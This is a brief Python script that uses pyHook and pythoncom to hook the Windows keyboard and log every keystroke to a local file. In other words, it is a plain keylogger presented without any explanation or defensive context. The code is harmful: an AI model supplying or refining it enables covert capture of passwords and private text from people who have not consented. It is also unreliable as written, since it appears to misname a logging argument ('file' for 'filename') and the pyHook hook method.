__author__ = 'Christian'

import logging
import sys
import pythoncom
import pyHook

LOG = '.\log.log'


def on_keyboard_event(event):
    logging.basicConfig(file=LOG, level=logging.DEBUG, format='%(message)s')
    logging.log(10, chr(event.Ascii))
    return True


hm = pyHook.HookManager()
hm.KeyDown = on_keyboard_event
hm.HookKeyBoard()
pythoncom.PumpMessages()